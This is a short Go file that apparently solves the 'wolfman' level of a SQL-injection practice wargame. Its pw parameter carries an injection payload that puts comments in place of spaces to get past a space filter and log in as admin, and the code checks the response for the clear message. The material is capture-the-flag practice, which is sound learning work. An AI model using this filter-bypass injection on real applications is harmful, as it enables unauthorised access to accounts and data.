package problem

import (
	"fmt"
	"strings"
)

func Wolfman(session string){
	file := "wolfman_c3698c0fc9ae7f97bb136cffc3823ae4.php"
	param := map[string]string{
		"pw" : "1'/**/or/**/id/**/=/**/'admin",
	}
	
	contents := connect(file, param, session)
	if strings.Contains(string(contents),"WOLFMAN Clear!"){
		fmt.Println("WOLFMAN Clear!")
	}
}